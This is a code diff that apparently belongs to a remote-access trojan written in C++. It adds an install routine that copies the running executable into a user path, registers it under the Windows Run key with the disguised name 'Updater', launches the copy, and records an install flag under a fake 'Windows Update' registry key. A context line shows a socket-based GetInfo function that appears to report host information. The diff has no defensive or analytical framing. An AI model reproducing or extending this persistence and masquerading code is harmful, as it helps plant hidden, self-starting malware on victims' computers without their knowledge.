@@ -1,5 +1,36 @@
 #pragma once
 
+bool IsInstalled()
+{
+	RegUtils ru;
+
+	return (ru.RegRead("SOFTWARE\\Windows Update", "Install State", REG_SZ) == "true");	
+}
+
+void InstallClient()
+{
+	Settaggi sett;
+	RegUtils ru;
+	SystemUtils su;
+	DirUtils du;
+
+	sett.InstallSettings();
+
+	string PathToCopy = sett.InstallPath + "\\" + sett.ExeName;
+
+	if (PathToCopy.find("<User>") != string::npos)
+		PathToCopy.replace(PathToCopy.find("<"), PathToCopy.find(">") + 1 - PathToCopy.find("<"), su.GetCurrentUser());
+
+	if (sett.RegStartup)
+		ru.RegWrite("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", "Updater", REG_SZ, PathToCopy.c_str());
+
+	du.CopyPasteFile(du.GetFullModuleFilePath(), PathToCopy);
+	
+	su.RunExe(PathToCopy);
+
+	ru.RegWrite("SOFTWARE\\Windows Update", "Install State", REG_SZ, "true");
+}
+
 bool GetInfo(SOCKET Sock)
 {
     SystemUtils su;
